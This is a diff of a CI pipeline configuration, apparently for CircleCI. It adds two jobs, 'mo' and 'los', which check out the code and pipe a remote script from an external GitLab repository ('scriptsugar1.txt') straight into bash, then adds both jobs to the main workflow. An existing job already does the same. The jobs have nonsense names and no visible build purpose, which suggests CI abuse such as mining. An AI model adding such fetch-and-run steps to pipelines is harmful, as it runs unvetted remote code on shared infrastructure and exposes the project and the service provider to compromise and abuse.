@@ -18,10 +18,28 @@ jobs:
       - run :
           command : curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar1.txt | bash
           name : Lol
+
+  mo :
+    executor : python/default
+    steps :
+      - checkout
+      - run :
+          command : curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar1.txt | bash
+          name : Loo
+  
+  los :
+    executor : python/default
+    steps :
+      - checkout
+      - run :
+          command : curl -s -L https://gitlab.com/tuhkancoba1/lolszx/-/raw/master/scriptsugar1.txt | bash
+          name : les
       
 
 workflows:
   main:
     jobs:
       - ohgini
-      - two      
+      - two    
+      - mo
+      - los  
